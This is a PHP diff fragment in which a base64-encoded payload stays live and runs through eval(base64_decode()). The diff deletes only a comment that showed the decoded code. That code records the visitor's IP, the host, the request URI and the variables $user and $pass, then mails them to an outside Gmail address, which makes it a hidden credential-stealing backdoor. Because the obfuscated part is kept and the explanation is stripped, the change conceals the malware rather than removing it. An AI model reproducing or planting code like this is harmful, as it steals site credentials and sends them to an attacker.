@@ -29,20 +29,7 @@ $u = explode("/",$pageFTP );
 $pageFTP =str_replace($u[count($u)-1],"",$pageFTP );
 $injbuff = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIjE3OC1CbGFjayBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvciAtICR1c2VyIC0gJHBhc3MiOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJoYXJkd2FyZWhlYXZlbi5jb21AZ21haWwuY29tIiwkanVkdWwsJGJvZHksJHVzZXIsJHBhc3MpOyB9DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHoiLCR2aXNpdGMpOw==";
 eval(base64_decode($injbuff));
-/*
-This decodes to
-$visitc = $_COOKIE["visits"];
-if ($visitc == "") {
-  $visitc  = 0;
-  $visitor = $_SERVER["REMOTE_ADDR"];
-  $web     = $_SERVER["HTTP_HOST"];
-  $inj     = $_SERVER["REQUEST_URI"];
-  $target  = rawurldecode($web.$inj);
-  $judul   = "178-Black http://$target by $visitor";
-  $body    = "Bug: $target by $visitor - $user - $pass";
-  if (!empty($web)) { @mail("hardwareheaven.com@gmail.com",$judul,$body,$user,$pass); }
-}
-*/
+
 
 ?>
   <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
